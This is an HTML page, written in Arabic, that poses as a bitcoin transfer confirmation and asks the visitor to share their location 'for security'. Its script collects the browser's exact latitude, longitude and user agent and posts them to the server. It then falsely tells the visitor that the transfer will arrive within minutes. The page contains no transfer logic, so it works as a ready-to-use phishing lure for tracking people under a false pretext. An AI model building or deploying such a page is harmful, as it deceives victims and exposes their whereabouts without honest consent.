<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Bitcoin Transfer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
    .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
    button { padding: 12px 25px; background-color: #f7931a; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="card">
    <h2>🔐 تأكيد تحويل البيتكوين</h2>
    <p>الرجاء تأكيد موقعك الجغرافي لضمان الأمان قبل إتمام التحويل</p>
    <button onclick="getLocation()">تأكيد</button>
  </div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendData, () => {
          alert("❌ لا يمكن إتمام التحويل بدون إذن الموقع.");
        });
      } else {
        alert("🌐 متصفحك لا يدعم تحديد الموقع.");
      }
    }

    function sendData(position) {
      fetch("/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          userAgent: navigator.userAgent
        })
      }).then(() => {
        alert("✅ تم تأكيد العملية. سيتم تحويل المبلغ خلال دقائق.");
      });
    }
  </script>
</body>
</html>
